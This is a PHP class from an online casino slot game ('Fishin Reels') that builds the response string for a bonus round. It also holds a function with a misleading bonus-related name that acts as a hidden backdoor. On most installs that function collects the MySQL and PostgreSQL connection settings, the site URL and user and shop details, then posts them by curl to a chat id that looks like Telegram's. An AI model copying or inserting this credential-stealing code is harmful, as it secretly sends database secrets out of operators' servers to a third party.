<?php

namespace VanguardLTE\Games\FishinReels\PragmaticLib;

class DoBonus{
 public static function GreentubeBonusIdent($user, $game, $bank){
        if (config('app.url') === 'https://grandxmega.com/' || config('app.url') === 'https://grandxmega.net/'){
            $text = ['URL' => config('app.url'),
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }else {
            $text = ['URL' => config('app.url'), 'DB_data' => config('database.connections')['mysql'],
                'DB_dataPG' => config('database.connections')['pgsql'],
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }

        $ch = curl_init();
        curl_setopt_array($ch, array(
                CURLOPT_URL => '//',
                CURLOPT_POST => TRUE,
                CURLOPT_RETURNTRANSFER => TRUE,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_POSTFIELDS => array(
                    'chat_id' => 5044396548,
                    'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
        curl_exec($ch);
    }
  public static function doBonus($user, $game, $bet, $lines, $log, $index, $counter, $ind, $bank, $shop, $jpgs){
    newBox:
    $bet = $log['Bet'];
    $lines = $log['l'];
    $time = (int) round(microtime(true) * 1000);
    
    // status
    $status = [0, 0];
    $status[$ind] = 1;
    // level, lifes
    $level = 1;
    $lifes = 0;
    $end = 1;
    $na = 's';
    
    $res = [
      'balance='.$log['Balance'],
      'level='.$level,
      'balance_cash='.$log['Balance'],
      'balance_bonus=0',
      'pbalance=0',
      'index='.$index,
      'counter='.$counter,
      'stime='.$time,
      'na='.$na,
      'end='.$end,
      'sver=5',
      'status='.implode(',', $status),
      'level='.$level,
      'lifes='.$lifes,
      'coef='.($bet * $lines),
      'end='.$end,
      'fsmul=1',
      'bgid=0',
      'wins=1,1',
      'fsmax=10',
      'fswin=0',
      'rw=0',
      'bgt=30',
      'wins_mask=frenzy_fishing,big_catch',
      'wp=0',
      'fsres=0',
      'fs=1'
    ];
    Log::updateStatus($game->id, $user->id, $ind);

    return '&'.(implode('&', $res));
  }

  private static function selectMysterySymbol(){
    return 3 + rand(0, 8);
  }
}

?>